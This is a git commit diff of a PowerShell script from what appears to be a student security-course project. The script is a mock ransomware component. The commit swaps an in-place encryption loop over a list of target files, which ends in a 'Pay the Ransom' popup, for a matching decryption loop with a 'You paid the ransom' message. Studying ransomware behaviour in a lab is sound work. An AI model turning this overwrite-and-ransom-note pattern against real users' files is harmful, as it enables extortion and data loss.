2c400dd16302ca9577d106ad455f68612972593f
JonathanMorseRIT <jam7142@rit.edu>
2025-11-17 11:21:33 -0800

    Working enc and dec for entire folder

--- rerun.ps1
+++ rerun.ps1
@@ -1,7 +1,7 @@
-#main executable file for encryption
+#main executable file for decryption
 
 $FilesToEncrypt = "C:\Users\Jonathan\CSEC-604-Project-Repo\EncryptionTargets.txt"
-$EncScript = "C:\Users\Jonathan\CSEC-604-Project-Repo\Protect-AESFile.ps1"
+$DecScript = "C:\Users\Jonathan\CSEC-604-Project-Repo\Unprotect-AesFile.ps1"
 $Storage = "C:\Users\Jonathan\CSEC-604-Project-Repo\encrypted-text-storage.txt"
 
 Get-Content $FilesToEncrypt | Where-Object {$_.Trim() -ne ""} | ForEach-Object{
@@ -9,8 +9,8 @@ Get-Content $FilesToEncrypt | Where-Object {$_.Trim() -ne ""} | ForEach-Object{
 
 	if (Test-Path $FilePath) {
 		
-		Write-Host "Encrypting file: $FilePath"
-		& $EncScript -InFile $FilePath -OutFile $Storage -PasswordFile Password.txt
+		Write-Host "Decrypting file: $FilePath"
+		& $DecScript -InFile $FilePath -OutFile $Storage -PasswordFile Password.txt
 		[IO.File]::WriteAllBytes($FilePath, [IO.File]::ReadAllBytes($Storage))
 	}
 	else{
@@ -18,8 +18,5 @@ Get-Content $FilesToEncrypt | Where-Object {$_.Trim() -ne ""} | ForEach-Object{
 	}
 
 }
-
 $wshell = New-Object -ComObject Wscript.Shell
-$result = $wshell.popup("Pay the Ransom (0 Dollars and 0 Cents", 0, "You've been encrypted", 0)
-
-
+$result = $wshell.popup("Your files are back to normal", 0, "You paid the ransom", 0)
